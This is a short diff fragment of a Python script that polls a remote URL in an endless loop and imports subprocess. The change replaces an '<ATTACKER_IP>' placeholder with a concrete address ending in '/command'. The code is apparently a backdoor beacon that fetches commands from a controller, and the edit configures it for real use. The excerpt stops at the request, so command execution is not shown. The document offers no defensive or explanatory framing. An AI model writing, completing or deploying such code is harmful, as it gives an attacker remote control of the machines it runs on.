@@ -2,7 +2,7 @@ import time
 import urllib.request
 import subprocess
 
-url = "http://<ATTACKER_IP>"
+url = "http://10.42.0.5/command"
 
 while True:
     response = urllib.request.urlopen(url)
